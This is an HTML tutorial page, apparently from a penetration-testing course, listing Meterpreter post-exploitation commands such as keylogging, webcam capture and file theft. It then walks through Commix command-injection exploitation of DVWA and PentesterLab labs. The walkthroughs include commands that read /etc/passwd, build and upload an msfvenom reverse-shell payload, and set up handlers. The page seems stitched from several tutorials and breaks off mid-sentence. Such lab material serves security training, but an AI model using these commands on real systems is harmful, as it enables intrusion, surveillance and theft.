@@ -1,0 +1,324 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+}
+
+.sidenav {
+  height: 100%;
+  width: 230px;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #111;
+  overflow-x: scroll;
+  padding-top: 20px;
+}
+
+.main {
+        height: 100%;
+        width: 1020px;
+        position: fixed;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        background-color: #fff;
+        overflow-x: fixed;
+        overflow-y: scroll;
+        padding-top: 0px;
+	float: center;
+    }
+
+
+.sidenav a {
+  padding: 6px 8px 6px 16px;
+  text-decoration: none;
+  font-size: 15px;
+  color: white;
+  display: block;
+}
+
+.sidenav a:hover {
+  color: red;
+}
+
+.main {
+  margin-left: 240px; /* Same as the width of the sidenav */
+  font-size: 30px; /* Increased text to enable scrolling */
+  padding: 0px 10px;
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 18px;}
+}
+</style>
+</head>
+<body>
+<div class="sidenav">
+<a href="1.html">🌐【WordPress Penetration Testing】🖧</a>
+  <a href="2.html">🌐【PenTesting Lab Setup: Squid Proxy &  Burpsuite Payloads】🖧</a>
+  <a href="3.html">🌐【Beginner Guide to Google Dorks】🖧</a>
+  <a href="4.html">🌐【Introduction to Command Injection】🖧</a>
+ <a href="5.html">🌐【WebServer Shell-ing through PhpMyAdmin】🖧</a>
+  <a href="6.html">🌐【Comprehensive Guide on FFUF & HTTPX】🖧</a>
+  <a href="7.html">🌐【Comprehensive Guide on HTML & XXE Injection】🖧</a>
+<a href="8.html">🌐【NetCat for PenTesting & Web Framework Reverse Shell】🖧</a>
+  <a href="9.html">🌐【Web Shells Penetration Testing】🖧</a>
+  <a href="10.html">🌐【Database Penetration Testing】🖧</a>
+ <p align="center"><img src="https://pwa-audio-player.digitalskeleton.com.ng/p.jpg" height="90" width="200"></p>
+</div>
+<div class="main">
+<div class="markdown-heading" dir="auto">
+<h2 class="heading-element" dir="auto" tabindex="-1"><p align="left">🌐Introduction to Command Injection🖧</p></h2>
+<p>Metasploit is a security project or we can say a framework provided to us in order to run exploit code in the target&rsquo;s PC.</p>
+<p>Metasploit in current scenario includes more than 1600 exploits. It has more than 420 payloads right now which includes command shell, Meterpreter etc.</p>
+<p>Meterpreter is generated only when the session is created. It helps in gaining full access to the target machine.</p>
+<p>Once the meterpreter is generated we can have full access to the target machine. Meterpreter includes more than 300 commands which can help us in exploiting the target machine. Help command is the most basic meterpreter command which will provide us with all the commands which can be performed on the target machine.</p>
+<p>Some of the meterpreter commands are given below:</p>
+<h3><strong>Sysinfo</strong></h3>
+<p>This command will provide the system&rsquo;s information of the victim. It will provide us every detail of the victim&rsquo;s PC such as architecture, Operating system in the target machine, how many users are logged in into that machine, system&rsquo;s language.</p>
+<p><img src="https://3.bp.blogspot.com/-7J_B55BwBUE/WWSXlL3fKHI/AAAAAAAAQdI/fuhDZD4Xqpo_0VZ-aHwr_62HHOtTAcvmACEwYBhgL/s1600/1.png" alt="" /></p>
+<h3><strong>Getuid</strong></h3>
+<p>This command will provide the identification of the user of the remote PC.</p>
+<p><img src="https://2.bp.blogspot.com/-bS-nBS1dE6s/WWSXnx7y5KI/AAAAAAAAQdw/t3h7mJ2B34oDj0CUAaP95e3HGZ7nUgUiQCEwYBhgL/s1600/2.png" alt="" /></p>
+<h3><strong>Getprivs</strong></h3>
+<p>This command checks the privilege present in the remote PC. If the enabled process privileges are less than the current working user is not the admin.</p>
+<p><img src="https://1.bp.blogspot.com/-_W937VIY18Q/WWSXq0uT_0I/AAAAAAAAQeA/ZjxZb0IXpEE6PQuqlW14QX36gv1FOATrQCEwYBhgL/s1600/3.png" alt="" /></p>
+<h3><strong>Pwd</strong></h3>
+<p>Pwd stands for present working directory. It shows the current working directory in the remote PC.</p>
+<p><img src="https://1.bp.blogspot.com/-ncXHdMHE_W8/WWSXqmLvghI/AAAAAAAAQd8/qmoblinds9gwzo2EGrxftC2X00ILU_T2wCEwYBhgL/s1600/4.png" alt="" /></p>
+<p>The image above clearly shows that the user is currently in the Downloads.</p>
+<h3><strong>PS</strong></h3>
+<p>PS command here stands for the process. It will show all the running processes in the remote PC.</p>
+<p><img src="https://1.bp.blogspot.com/-TA7qL-Esl0A/WWSd03XLfeI/AAAAAAAAQfg/rNrq1uE14E88mFMpZ-aPuSCknNSKKTN3gCLcBGAs/s1600/5.png" alt="" /></p>
+<p>The image above is providing all the running processes followed by the process id in the victim&rsquo;s PC.</p>
+<h3><strong>Keylogger</strong></h3>
+<p>Keylogger includes 3 basic functions:</p>
+<h3><strong>keyscan_start</strong></h3>
+<p>This command will start scanning the keyboard activity of the remote PC.</p>
+<h3><strong>keyscan_dump</strong></h3>
+<p>This command will dump the keyboard activity of the remote PC i.e, it will capture the input and display on our screen.</p>
+<h3><strong>keyscan_stop</strong></h3>
+<p>This command will stop scanning the keyboard activity of the remote PC.</p>
+<p><img src="https://4.bp.blogspot.com/-8-8e5N3tIOI/WWSZVqV2-aI/AAAAAAAAQfE/Pf50CPbYBQwz2z8WJtU_lhIMTQQiIXX-wCEwYBhgL/s1600/6.png" alt="" /></p>
+<p>As we can clearly see in the above-given image that the input given by the victim is visible to us.</p>
+<h3><strong>Show_mount</strong></h3>
+<p>This command will show all the drives present in the remote PC. The drives with the total size and available size in the target&rsquo;s PC is displayed below.</p>
+<p><img src="https://1.bp.blogspot.com/-Pegb_hR9_XQ/WWSZYmCZN0I/AAAAAAAAQfM/t-S-r-NJUtAkTfoUjGOUJe6bIms7cyF5gCEwYBhgL/s1600/7.png" alt="" /></p>
+<h3><strong>Screenshot</strong></h3>
+<p>By using this command screenshot of the remote PC is captured and is saved in our PC. The path is also provided where the screenshot is saved as shown in the image below.</p>
+<p><img src="https://4.bp.blogspot.com/-NIEJDCalmvA/WWSZZcp1xXI/AAAAAAAAQfQ/hYIoWdpr620PT3rlT2I4VaW4_LR2Q-PdgCEwYBhgL/s1600/8.png" alt="" /></p>
+<h3><strong>Upload</strong></h3>
+<p>By using this command we can upload any file into the victim&rsquo;s PC.</p>
+<p>To upload the file in remote PC we have to provide the path of the file with the filename and extension of the file as well as the destination where we want to upload.</p>
+<p><img src="https://3.bp.blogspot.com/-nlzGpJqmJWk/WWSZZ0fgUgI/AAAAAAAAQfY/V0nJD5rTyXUs6AnoeYYOqWQ1AwsLGpxOQCEwYBhgL/s1600/9.png" alt="" /></p>
+<h3><strong>Download</strong></h3>
+<p>By using this command we can download any file from the victim&rsquo;s PC.</p>
+<p>To download the file we have to first provide the path from where we want to download followed by the file name and extension of the file. In the last, we have to add the path where we want to save that downloaded file.</p>
+<p><img src="https://2.bp.blogspot.com/-RHuZBmXaa8A/WWSZE3kORII/AAAAAAAAQeI/pyFOcv8ggVg2hvnqD_xbOYQ_iraRKJoqwCEwYBhgL/s1600/10.png" alt="" /></p>
+<h3><strong>Shell</strong></h3>
+<p>Shell command will provide us the access of the command prompt of the remote PC. After having access to the command prompt we can use any cmd command to exploit victim&rsquo;s PC.</p>
+<p><img src="https://3.bp.blogspot.com/-z6s1a4qjfTg/WWSZEwCs4YI/AAAAAAAAQeM/EkFUH_l4mwkQCoPzgGUxm-h-Ol_UzHP8ACEwYBhgL/s1600/11.png" alt="" /></p>
+<h3><strong>Getsid</strong></h3>
+<p>In this command, sid stands for security identifier. This command will provide the server sid.</p>
+<p><img src="https://2.bp.blogspot.com/-r17p-LTf5J4/WWSZGyKpVWI/AAAAAAAAQeY/4wk0_WMBTsw46yyzbAFTV2zf5BnZJxbpQCEwYBhgL/s1600/12.png" alt="" /></p>
+<h3><strong>Ipconfig</strong></h3>
+<p>This command will tell us the IP Address of the remote PC. We will also be able to know the Mac Address of the remote PC.</p>
+<p><img src="https://4.bp.blogspot.com/-cmqNMpTD8UE/WWSZHJVtwNI/AAAAAAAAQec/5TcWozD36loE18OTc2_VxY-cdjVXyYbgQCEwYBhgL/s1600/13.png" alt="" /></p>
+<h3><strong>Background</strong></h3>
+<p>This command will send the current active meterpreter session to the background. If you want to go back to the previous session just write sessions and then we will be able to see the active session in our PC. If there is more than one session then we only have to write sessions followed by the session id and we will have the access of that machine whose session id we just selected.</p>
+<p><img src="https://2.bp.blogspot.com/-bPPaOIkmAJw/WWSZGk7M25I/AAAAAAAAQeU/7nJSGLia_JoN65KuRykKLFtGLhMaJchfgCEwYBhgL/s1600/14.png" alt="" /></p>
+<h3><strong>Migrate</strong></h3>
+<p>This command helps in transferring the current going process from one port to another port.</p>
+<p><img src="https://3.bp.blogspot.com/-7Vjobdjrn94/WWSZH3Xru5I/AAAAAAAAQeg/Y21SnS-TosIdZYtAnQ11bCazuLZ-WBENgCEwYBhgL/s1600/15.png" alt="" /></p>
+<p>As you can see in the image above we have transferred the current going process from port no 3872 to port no 2224.</p>
+<h3><strong>Reboot</strong></h3>
+<p>This command will reboot the remote PC.</p>
+<p><img src="https://3.bp.blogspot.com/-h2UAIBn-drc/WWSZIFWQ76I/AAAAAAAAQek/l3e6IjJeFKc-5RW1_BhtS6A5ssh0y1mxgCEwYBhgL/s1600/16.png" alt="" /></p>
+<h3><strong>Webcam_snap</strong></h3>
+<p>This command will take a snap of the remote PC.</p>
+<p><img src="https://1.bp.blogspot.com/-M7yiyU36FhI/WWSZIdFK-uI/AAAAAAAAQeo/LH239B5hGFQzav66btXaXLE58sf7XiaRACEwYBhgL/s1600/17.png" alt="" /></p>
+<p><img src="https://1.bp.blogspot.com/-F0JatN-30Eg/WWSZZptAHtI/AAAAAAAAQfU/0rOm8D2WwcAbkRQ2s2m4DSHGpZeZKlHqACEwYBhgL/s1600/18.png" alt="" /></p>
+<p>As you can see the above-given image is the snap taken by the remote PC.</p>
+<h3><strong>Getpid</strong></h3>
+<p>This command will provide us with the process id of the currently running process. The currently running process in the target machine has process id 9040 which is displayed in the below-provided image.</p>
+<p><img src="https://3.bp.blogspot.com/-Y4cecqLgmc0/WWSZKDU496I/AAAAAAAAQew/V4jKvK7mlhUdNlWx_1OQUBq3IMCWP62-ACEwYBhgL/s1600/19.png" alt="" /></p>
+<h3><strong>Localtime</strong></h3>
+<p>This command will just show us the date and time of the remote PC.</p>
+<p><img src="https://4.bp.blogspot.com/-ejHbXmhQvE8/WWSZM5svLjI/AAAAAAAAQe0/HcGQCSPKy8wr_zBZp-kLfaK87gNyC-rnQCEwYBhgL/s1600/20.png" alt="" /></p>
+<h3><strong>Checksum</strong></h3>
+<p>This command will provide the hash value of the given file. We just have to write the command followed by the name of the file as well as the extension of it. The hash value is basically the value distinctly generated for every file to maintain the integrity of the file. If there is any kind of modification in the file the hash value is changed even if there is a modification of a single character.</p>
+<p>The above-given image provides the hash value of the file kJMKzE.</p>
+<p><img src="https://3.bp.blogspot.com/-yvlxcrF1qPI/WWSZNqHFmmI/AAAAAAAAQe4/lqUh-F5sUAszjlIgySFNTzfnQRTNeNIzgCEwYBhgL/s1600/21.png" alt="" /></p>
+<p>&nbsp;</p>
+<h1 class="post-title entry-title">Commix-Command Injection Exploiter (Beginner&rsquo;s Guide)</h1>
+<p>In this guide, we learn how to use Commix from scratch by using all the basic commands and going all the way to the advanced ones.</p>
+<h3><strong>Contents</strong></h3>
+<ul>
+<li>Introduction to command injection</li>
+<li>Introduction to Commix</li>
+<li>Working of Commix</li>
+<li>Types of Commix</li>
+<li>Requirements</li>
+</ul>
+<h3><strong>Introduction to Command Injection</strong></h3>
+<p>Command injection is also known as shell injection or OS injection. Command injection is one of the top 10 OWASP vulnerability. it&rsquo;s an attack in which arbitrary commands of a host OS are executed through a vulnerable application. Such an attack is possible when a web application sends unsafe user data to the system shell. This user data can be in any form such as forms, cookies, HTTP headers, etc. Mostly the vulnerability command injection rises due to insufficient input validation. In this attack, the default functionality of the application is extended by an attacker who then executed the system commands with injecting code which makes it different from code injection.</p>
+<p>The process of command injection was accidentally discovered in 1997 by a programmer in Norway. This accident led to the deletion of web pages of a site. SQL command injection is the most popular form of command injection. Through this attack, an attacker adds SQL code to the input box in order to gain access. Web applications are compulsory for such attacks as we communicate with the underlying OS via such web applications.</p>
+<h3><strong>Introduction to Commix</strong></h3>
+<p>Commix tool is automated for exploiting the vulnerability of command injection in web applications. This tool is written in python which means it is compatible with Linux, windows&nbsp;and&nbsp;mac. It comes pre-installed in Kali Linux, BlackArch and Parrot OS. This tool makes it very easy to find vulnerabilities related to command injection and then further exploit them. The user-friendliness of commix makes it very convenient for everyone, such as web developers, pen testers or security researchers, to use it.</p>
+<p>It provides a user with a lot of options such as including the ability to specify parameters that you need to connect to host, enumeration of a victim, accessing files and their modification along with an offline mode. Hence, it&rsquo;s a pretty useful asset in order to exploit command injection vulnerability.</p>
+<h3><strong>Working of Commix</strong></h3>
+<p>Commix has various command options which you can use to find and connect with the target application. Few of the options target URL is via data strings, HTTP headers, cookies and authentication parameters. There are various enumerations options present too. Commix supports two command injection techniques i.e. result-based command injection technique and blind command injection technique. Result based command injection is the once where commands are reflected back to the attacker in the web application. Whereas blind command injection technique is persuading when the response is not reflected on a web application.</p>
+<h3><strong>Types of Command Injection in Commix</strong></h3>
+<p><strong>Result based command injection</strong></p>
+<p>This type of injection attack will let you deduce the result of the injected command through the result of a web application. It is further divided into two categories :</p>
+<ul>
+<li>Classic result based injection : This is the most commonly used type of command injection and is the simplest of all. In this, several common operators are used which either links genuine commands with the injected ones or exclude the initial commands altogether and goes ahead to execute the injected ones only. this further divides into 3 categories i.e. Shellshock, ICMP exfiltration, DNS exfiltration.</li>
+<li>Eval-Based technique : This technique is used where the targeted web application is vulnerable to eval() function. This eval function is used to execute the peculiar code that is defined in the said function during run time.</li>
+</ul>
+<p><strong>Blind Command Injection</strong></p>
+<p>The way that the data is retrieved after the execution of injected shell command is the main difference between the working of both the types. In the case where web application does not give any result back to the attacker; blind command injection is used. There are further two types of blind command injection :</p>
+<ul>
+<li>Time-based Technique : Using this technique will delay the time of the execution of a command that is injected. By checking how much time the application took to revert will able the attacker to determine whether the command is executed successfully or not.</li>
+<li>File-based Technique : If you are not able to determine the result of the web application through its reaction, then this technique comes in handy as it will allow you to write the set of commands that are to be injected in the file accessible to the attacker. Working&nbsp;of&nbsp;this technique is similar to that of result based technique.</li>
+</ul>
+<h3><strong>Requirements</strong></h3>
+<ul>
+<li>DVWA</li>
+<li>PentestLab</li>
+<li>Kali Linux</li>
+<li>Commix Tool</li>
+</ul>
+<p>Some of the practical we will do in pentestlab for Linux and others we will perform on DVWA for windows.&nbsp; Let&rsquo;s start with the&nbsp;practical&nbsp;of commix. First, we will use help command to check all the options that we use to exploit target via commix.</p>
+<pre class="lang:default decode:true">commix &ndash;h</pre>
+<p><img src="https://1.bp.blogspot.com/-SxdXFkzHl9k/XHjmpuga18I/AAAAAAAAdLc/78Mta0LsIO4tdHyIcPVnqRMwJieAjwiQwCLcBGAs/s1600/1.png" alt="" /></p>
+<p>Now let&rsquo;s try and get a commix session using the URL. For this, use the URL that is vulnerable to the command injection, here, we will pentesterlab&rsquo;s URL as shown in the image below :</p>
+<p><img src="https://2.bp.blogspot.com/-7gq2U5XwuWE/XHjmrlzh4lI/AAAAAAAAdL8/1DK1BMgmwzkb7Ub8MxtubCLs-jm9Ak2CwCLcBGAs/s1600/2.png" alt="" /></p>
+<p>Use the following command to have a commix session through URL :</p>
+<pre class="lang:default decode:true">commix -u &lt;URL&gt;</pre>
+<p>And so, with this command you get a commix(os_shell) as shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-l8P-m4rPGTs/XHjmsFiLJdI/AAAAAAAAdME/gSMEGiRLspsHfytsK0MKSynfY92PhNtlQCLcBGAs/s1600/3.png" alt="" /></p>
+<p>Now, let&rsquo;s use the batch command to have the commix session by default and for this use the following command :</p>
+<pre class="lang:default decode:true">commix -u &lt;URL&gt; --batch</pre>
+<p><img src="https://1.bp.blogspot.com/-tePpm61DIKg/XHjmsdhqi_I/AAAAAAAAdMI/FHowWtxmFD89UQUra2QJMapANC6x0j79gCLcBGAs/s1600/4.png" alt="" /></p>
+<p>Now, as you can see in the above image, we have directly entered the session by default. Now, to get all the basic information about the target use the following command :</p>
+<pre class="lang:default decode:true">commix -u &lt;URL&gt; --all</pre>
+<p><img src="https://3.bp.blogspot.com/-jYgVXm8jdOI/XHjmsshsTbI/AAAAAAAAdMM/OVvciIgJCoAT3Jbz-haptMHRpnotQ4-DwCLcBGAs/s1600/5.png" alt="" /></p>
+<p>As shown in the image above, using the above command will give you all the basic information about the target. Next, with the help of the following command we can know the current user of target :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --current-user</pre>
+<p><img src="https://1.bp.blogspot.com/-LExvjAtiQrM/XHjmtCwsQKI/AAAAAAAAdMU/7PwBzRTtk7w84JHn7dSE9uKi3iQt_EDuACLcBGAs/s1600/6.png" alt="" /></p>
+<p>As a result of the above command, you can see in the above that the current user is www-data. Now, we can also find out the hostname by using the following command :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --hostname</pre>
+<p><img src="https://3.bp.blogspot.com/-LQjtWIBfKBY/XHjmtPvzWcI/AAAAAAAAdMQ/jPAEb16qaUMqFWg0NnPDW7k64loC6WwogCLcBGAs/s1600/7.png" alt="" /></p>
+<p>Hence, the host is Debian. Now, the question is how we can determine whether the out target is rooted or not. So, for this, we have the following command :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --is-root</pre>
+<p><img src="https://3.bp.blogspot.com/-D67Ga0adQow/XHjmtb70XGI/AAAAAAAAdMY/eZrtlNyxfukNROFDQCrqGaqbXy4ayKzdwCLcBGAs/s1600/8.png" alt="" /></p>
+<p>This way we found that our target was not rooted. Use the following command to have the information about the system :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --sys-info</pre>
+<p><img src="https://4.bp.blogspot.com/-c2gCZ8GALUM/XHjmt4qL9oI/AAAAAAAAdMc/8xVla15Uz0osi2TxRbPo_kyhIYvU9P-2gCLcBGAs/s1600/9.png" alt="" /></p>
+<p>Upon executing the above command, we now have the system information. To have information about users, use the following command :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --users</pre>
+<p><img src="https://4.bp.blogspot.com/-1a7ELHlAtwQ/XHjmpqIVCJI/AAAAAAAAdLg/nfCqiXSu1DYPMeoZmm1_e3WBoPM970t-wCLcBGAs/s1600/11.png" alt="" /></p>
+<p>And this way, we have a list of all the users. Next command is used to know about the admin of the system :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --is-admin</pre>
+<p><img src="https://4.bp.blogspot.com/-LstRi7kSv0E/XHjmpjtvLaI/AAAAAAAAdLY/OFbZihKZn_QrjmBCq2ZFkl55rYZ-oCPeACLcBGAs/s1600/12.png" alt="" /></p>
+<p>And again you can see that the target is not the admin. Now to read the contents of&nbsp;a desired&nbsp;file, we can use the following command :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --file-read=/etc/passwd</pre>
+<p><img src="https://3.bp.blogspot.com/-MhhWi2Upy-Q/XHjmqL6GVdI/AAAAAAAAdLk/UbYqEU7jrOsDF3XUvg0cyj-7LcYTZ3OcACLcBGAs/s1600/13.png" alt="" /></p>
+<p>And the results of the above command are shown in the image above. Our next practicals are performed on DWVA (windows environment)</p>
+<p><img src="https://2.bp.blogspot.com/-Jly4DTeQK-4/XHjmqZSQLSI/AAAAAAAAdLo/YHf51fqoagsNNQXbyfXM0LEbctyYlDgRACLcBGAs/s1600/14.png" alt="" /></p>
+<p>Captured the cookies of the submitted request using BurpSuite.</p>
+<p><img src="https://1.bp.blogspot.com/-0-Ifcdpq3tQ/XHjmqiVKWFI/AAAAAAAAdLs/5qc663EeBOovEX77zoE29ou6Fx0vIMHUQCLcBGAs/s1600/15.png" alt="" /></p>
+<p>Now, we use this content of cookie to validate our session using the parameters &lsquo;&mdash;cookie&rsquo; and &lsquo;&mdash;data&rsquo;. These two parameters are used to send data string in order to exploit the POST method and to validate our session simultaneously. For this, use the following command :</p>
+<pre class="lang:default decode:true">commix &ndash;u &lt;URL&gt; --cookie="security=low; PHPSESSID=2r9avccki91i3uq2eqlud8sg08" --data="ip=127.0.0.1&amp;Submit=Submit"</pre>
+<p><img src="https://2.bp.blogspot.com/-kh3cI_t-9Ds/XHjmq7aMjSI/AAAAAAAAdLw/SzRZ6NsicNc70HpiMl-5PDy5glA0m_0LACLcBGAs/s1600/16.png" alt="" /></p>
+<p>With the help of above the command, we will directly have a session as shown in the image above. Now, we will create a malware file using msfvenom. Type the following command to generate your malware :</p>
+<pre class="lang:default decode:true">msfvenom &ndash;p python/meterpreter/reverse_tcp lhost=192.168.1.100 lport=1234 &ndash;f raw &gt; venom.py</pre>
+<p><img src="https://3.bp.blogspot.com/-mnVkwl2JGBc/XHjmrEdhCEI/AAAAAAAAdL0/kxqRFNO0g-sFpC1wgNGs6xnprP4gsEUkwCLcBGAs/s1600/18.png" alt="" /></p>
+<p>Now, we will use the above file and upload it in our target by using the following command :</p>
+<pre class="lang:default decode:true">commix -u &lt;URL&gt; --cookie="PHPSESSID=4029asg19ejeuibfq30d7lc1o8; security=low" --data="ip=127.0.0.1&amp;Submit=Submit" --file-write="/root/venom.py" --file-dest="/tmp/venom.py" --os-cmd="python /tmp/venom.py"</pre>
+<p><img src="https://3.bp.blogspot.com/-ODSpPOO2EJk/XHjmrS78RII/AAAAAAAAdL4/HQeHrPEUBxQ57VSbwr1Pue-LPGmG_mReACLcBGAs/s1600/19.png" alt="" /></p>
+<p>Now, the above command will upload and run our malware in the target machine. You can use multi/handler to get a session and for this use the following set of commands :</p>
+<pre class="lang:default decode:true">use exploit/multi/handler
+set payload python/meterpreter/reverse_tcp
+set lhost eth0
+set lport 1234
+run</pre>
+<p><img src="https://2.bp.blogspot.com/-xpfR0_1-eTk/XHjmr4BE-WI/AAAAAAAAdMA/62siXyvrCykHsqvJVVjslAp0QMSL9-lNACLcBGAs/s1600/20.png" alt="" /></p>
+<p>And this way, as shown in the image, you will have a meterpreter session. This is how you can use commix, a third party automated tool, to your advantage.</p>
+<h1>Command Injection to Meterpreter using Commix.</h1>
+<p>Commix is an automated command injection tool. It lets you have a meterpreter session via command injection if the web application is vulnerable to it. It&rsquo;s pretty efficient and reliable. Commix is widely used by security experts, penetration testers and also web developers in&nbsp;order&nbsp;to find vulnerabilities. In this&nbsp;guide, we will learn how to get a meterpreter session using commix.</p>
+<h3>Requirements :</h3>
+<ul>
+<li>DVWA (for Windows 10)</li>
+<li>PentesterLab (for Linux testing)</li>
+<li>Kali Linux</li>
+<li>Commix</li>
+</ul>
+<p>As you can see in the image below the environment of DVWA is vulnerable to command injection. Submit the local host request from DVWA.</p>
+<p><img src="https://2.bp.blogspot.com/-TLsiNcwMUeM/XHP6FGZpwmI/AAAAAAAAc_4/NyWS7nTji4kfn3J9cJWMx4nkIfgElA8pACLcBGAs/s1600/1.png" alt="" /></p>
+<p>Capture the previously submitted request through BurpSuite by simultaneously turning on the intercept as shown in the image below :</p>
+<p><img src="https://2.bp.blogspot.com/-F_y_aK36ejA/XHP6HlREVFI/AAAAAAAAdAU/NbJY1dfv68ASu0qVa-E--_vlkUp3-rDIACLcBGAs/s1600/2.png" alt="" /></p>
+<p>Once the cookies are capture, copy the whole cookie and paste it in a&nbsp; TXT file. Now, use the following command in order to exploit the vulnerability of Command injection in the DVWA environment :</p>
+<pre class="lang:default decode:true">commix -r /root/Desktop/req.txt</pre>
+<p>here,</p>
+<p>&ndash;r:&nbsp;refers to the path of request file which will load HTTP.</p>
+<p>As the exploitation is successful, it will ask you if you want to load the pseudo terminal or not. Type &lsquo;y&rsquo; for the pseudo terminal and it will be loaded. Use the command &lsquo;whoami&rsquo; to check the user as shown in the image :</p>
+<p><img src="https://1.bp.blogspot.com/-iaPZODDt2-U/XHP6IKPc8GI/AAAAAAAAdAY/XiViWiyKdQ8gWkt3LT4Q0wJCv0m2h8b4QCLcBGAs/s1600/3.png" alt="" /></p>
+<p>Now that&nbsp;you&nbsp;are in the pseudo terminal, type the following set of command in order to generate reverse shell :</p>
+<pre class="lang:default decode:true">reverse_tcp
+set lhost 192.168.1.107
+set lport 1234</pre>
+<p>After executing&nbsp;the above&nbsp;commands, it will ask you if you want to have a netcat shell or other (meterpreter) shell. So, press 2 for the meterpreter one. Then it will ask you which meterpreter session you want as in whether you want it to be PHP, Windows, etc. As our DWVA is setup on windows, we will select option 10. Then it will further ask you to choose a particular power shell injection. Choose 1 as of now as we will try other options too.</p>
+<p><img src="https://1.bp.blogspot.com/-cT8-MXtTSzU/XHP6ImRnCuI/AAAAAAAAdAc/b-IWRVVbMTEiBxRytrECTfonnORKYGiWgCLcBGAs/s1600/4.png" alt="" /></p>
+<p>When everything is done, it will give a resource file with the execution command. Open a new terminal window and type the command there, as in our case it generated the following command :</p>
+<pre class="lang:default decode:true">msfconsole -r /usr/share/commix/powershell_attack.rc</pre>
+<p><img src="https://1.bp.blogspot.com/-RxH4VnsQUBA/XHP6JBNXHSI/AAAAAAAAdAg/QhFZ8sJm0EY7yqkeMWh9Np8-MS_z4TeswCLcBGAs/s1600/5.png" alt="" /></p>
+<p>As the above command is executed, you will directly have your meterpreter session as shown in the image above.</p>
+<p>Now, repeat the above steps as they are but instead of choosing 1 option of power shell injection&nbsp;to choose&nbsp;2 this time as it will help us get meterpreter session through magic unicorn. After choosing option 2, it will again generate a resource file that is to be executed in the new terminal window. In our case&nbsp;the following&nbsp;command was generated :</p>
+<pre class="lang:default decode:true">msfconsole -r /usr/share/magic-unicorn/unicorn.rc</pre>
+<p><img src="https://1.bp.blogspot.com/-FBOlU6s8aX8/XHP6JXBJx4I/AAAAAAAAdAk/F6fC_0UZzCkvoj9rqv1rqz_DbhcY-JqBACLcBGAs/s1600/6.png" alt="" /></p>
+<p>Again, when the command is executing you will have your meterpreter session as shown in the image below :</p>
+<p><img src="https://2.bp.blogspot.com/-y4-4oRVsQmE/XHP6Jgr2_9I/AAAAAAAAdAo/nLnHpEVdt38wpzaLwGyIL7v1cigYqV5IACLcBGAs/s1600/7.png" alt="" /></p>
+<p>All the above meterpreter session were taken using option 10 under the category of&nbsp;the meterpreter&nbsp;reverse shell. But this time we will use option 11, which is web delivery, to have a meterpreter session. So, repeat the same steps as above but this time choose 11 option when asked for which meterpreter reverse shell you want.</p>
+<p><img src="https://1.bp.blogspot.com/-hVGV-bMBjaY/XHP6KfWsUuI/AAAAAAAAdAs/YcEfjhmVs5ApJThdegPNPi5Rt4nv-OU1wCLcBGAs/s1600/8.png" alt="" /></p>
+<p>Then once you have chosen option 11, it will ask whether you want web delivery script for PHP, Python or windows. Now, as we are attacking windows select option 3.</p>
+<p><img src="https://2.bp.blogspot.com/-76WLkGGXfvQ/XHP6KZmI5iI/AAAAAAAAdAw/rUURdrAP4aAEsf0efUHZEcfFUROTGGUlwCLcBGAs/s1600/9.png" alt="" /></p>
+<p>Once again, it will give you a&nbsp;resource&nbsp;file and a command that is to be run in the new terminal window. In our case,&nbsp;the following&nbsp;command was generated :</p>
+<pre class="lang:default decode:true">msfconsole -r /usr/share/commix/web_delivery.rc</pre>
+<p>&nbsp;As the command is executed, you will have your meterpreter session as shown in the image below :</p>
+<p><img src="https://3.bp.blogspot.com/-Fx1wIxUvEBQ/XHP6Ex4Re4I/AAAAAAAAc_w/yVVhayACA1skAkfggKOESo9lKtdMFD48gCLcBGAs/s1600/10.png" alt="" /></p>
+<p>Until now, all the meterpreter session we took were in the&nbsp;Window&rsquo;s&nbsp;environment. Now, will be gain meterpreter session in Linux&rsquo;s environment. For this, we will use PentesterLab.</p>
+<p><img src="https://3.bp.blogspot.com/-DQmTsIEBaCE/XHP6FOFtAHI/AAAAAAAAc_0/SRk3vTxmR4YOgfAxJqoOv9im2u5jko6YwCLcBGAs/s1600/11.png" alt="" /></p>
+<p>Just like we did for windows, capture the cookies of&nbsp;pentesterlab&nbsp;in&nbsp;burp suite&nbsp;as shown in the image below :</p>
+<p><img src="https://1.bp.blogspot.com/-WHOWbfNXYcQ/XHP6F8RGo2I/AAAAAAAAc_8/AnVEFWYHtAo-ieZVU20KiqgJBPC4voXxACLcBGAs/s1600/12.png" alt="" /></p>
+<p>Copy the contents of the cookies in a TXT file and use the following command to attack :</p>
+<pre class="lang:default decode:true">commix -r /root/Desktop/1.txt</pre>
+<p>As the exploitation is successful, it will ask you if you want to load the pseudo terminal or not. Type &lsquo;y&rsquo; for the pseudo terminal and it will be loaded. Use the command &lsquo;whoami&rsquo; to check the user as shown in the image :</p>
+<p><img src="https://3.bp.blogspot.com/-88tvadHZRSU/XHP6GZz8UyI/AAAAAAAAdAE/XWST_KeGaNIimQDvh5vPUMi1KEKCwiKpgCLcBGAs/s1600/13.png" alt="" /></p>
+<p>Now that you are in the pseudo terminal, type the following set of command in order to generate reverse shell :</p>
+<pre class="lang:default decode:true">reverse_tcp
+set lhost 192.168.1.107
+set lport 1234</pre>
+<p>After executing&nbsp;the above&nbsp;commands, it will ask you if you want to have a netcat shell or other (meterpreter) shell. So, press 2 for the meterpreter one. Then it will ask you which meterpreter session you want as in whether you want it to be PHP, Windows, etc. As we are now testing on&nbsp;Linux, we will select option 8 i.e. a PHP meterpreter reverse shell.</p>
+<p><img src="https://3.bp.blogspot.com/-KdN9KUi0FZI/XHP6GDDUGjI/AAAAAAAAdAA/sPfMzkSWfD4vWHWl1yW-VhkrFRbOvmCXACLcBGAs/s1600/14.png" alt="" /></p>
+<p>Just like before, this too will generate a resource file which you have to execute in a new terminal window. In our case, the command generated was :</p>
